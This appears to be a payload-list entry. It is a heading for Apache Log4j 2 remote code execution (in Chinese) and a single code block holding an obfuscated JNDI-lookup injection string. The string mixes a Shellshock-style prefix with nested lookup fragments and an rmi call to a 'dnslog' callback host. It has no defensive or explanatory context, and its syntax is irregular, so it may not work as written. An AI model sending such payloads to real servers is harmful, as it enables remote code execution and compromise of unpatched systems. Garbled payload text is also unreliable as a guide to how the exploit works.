## Apache Log4j 2 远程代码执行

```
(){:;}{$:;$}{jndi:rmi${{::-:}}}//dnslog/test
```
